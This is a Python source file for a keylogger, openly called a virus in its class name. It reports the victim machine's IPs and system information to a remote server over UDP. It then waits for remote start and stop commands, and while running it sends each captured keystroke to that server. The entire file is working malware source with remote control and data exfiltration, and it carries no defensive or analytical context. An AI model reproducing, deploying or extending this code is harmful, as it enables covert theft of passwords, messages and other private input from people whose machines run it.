"""
@athor: Vuong Van Duy
keylogger.py
data: 14.10.2025

This script implements a keylogger that listens for UDP commands to start and stop logging keystrokes.
When started, it captures keystrokes and sends them via UDP to a specified server.
"""


from pynput.keyboard import Listener
import socket
import json
import time
from config import special_keys, IP
from utils import get_all_local_ips, get_system_info


class KeyloggerViruss():
    def __init__(self, host: str = "127.0.0.1", port_listen: int = 9998, port_send: int = 9999):
        self.host = host
        self.ip_self = get_all_local_ips(target_ip=IP)[0]['ip']
        self.info_self = get_system_info(target_ip=IP)
        self.port_listen = port_listen
        self.port_send = port_send
        self.FLAG_ACTIVE = False
        self.listener = None
        self.is_active_server = False

    def send_udp_message(self, message: str, signal: bool = True, timeout: float = 2.0):
        """
        Send a message over UDP.
        message: bytes
        host, port: destination
        timeout: timeout for socket (optional, UDP does not have ACK)
        """
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(timeout)
            try:
                request = {
                    "signal": signal,
                    "message": message,
                    "from_ip": self.ip_self,
                }
                sent = sock.sendto(json.dumps(request).encode(), (self.host, self.port_send))
                print(f"Sent {sent} bytes to {self.host}:{self.port_send}")
            except socket.timeout:
                pass
            except Exception as e:
                pass

    def on_press(self, key):
        try:
            if key in special_keys:
                key = special_keys[key]
            else:
                key = str(key).replace("'", "")
            self.send_udp_message(message=key, signal=True)
        except AttributeError:
            pass

    def start_monitor(self):
        if self.FLAG_ACTIVE:
            return

        self.listener = Listener(on_press=self.on_press, on_release=None)
        self.listener.start()
        self.FLAG_ACTIVE = True
        print("Keyboard monitor STARTED")

    def stop_monitor(self):
        if not self.FLAG_ACTIVE:
            return
        if self.listener is not None:
            self.listener.stop()
            self.listener.join(timeout=1.0)
            self.listener = None
        self.FLAG_ACTIVE = False
        print("Keyboard monitor STOPPED")

    def start_session(self):
        # self.start_monitor()
        self.send_udp_message(message=self.info_self, signal=True)


    def run_keylogger(self, buffer_size: int = 4096):

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind(('0.0.0.0', self.port_listen))
        sock.settimeout(1)
        print(f"UDP server listening on {self.host}:{9998} (press Ctrl+C to stop)")

        try:
            while True:
                try:
                    if not self.is_active_server:
                        self.start_session()
                        print(self.ip_self)
                        time.sleep(0.1)

                    try:
                        data, _ = sock.recvfrom(buffer_size)
                    except socket.timeout:
                        continue

                    try:
                        data = json.loads(data.decode())
                    except json.JSONDecodeError as e:
                        continue

                    if data.get("command", "") == "Server_active":
                        self.is_active_server = True
                        self.start_monitor()
                    elif data.get("command", "") == "start":
                        self.start_monitor()
                    elif data.get("command", "") == "stop":
                        self.stop_monitor()
                        message = "[KEYLOGGER STOPPED]"
                        self.send_udp_message(message=message, signal=False)
                        return
                except OSError as e:
                    break
        except KeyboardInterrupt:
            print("\nReceived Ctrl+C — shutting down server gracefully.")
        finally:
            sock.close()
            print("Socket closed. Bye.")
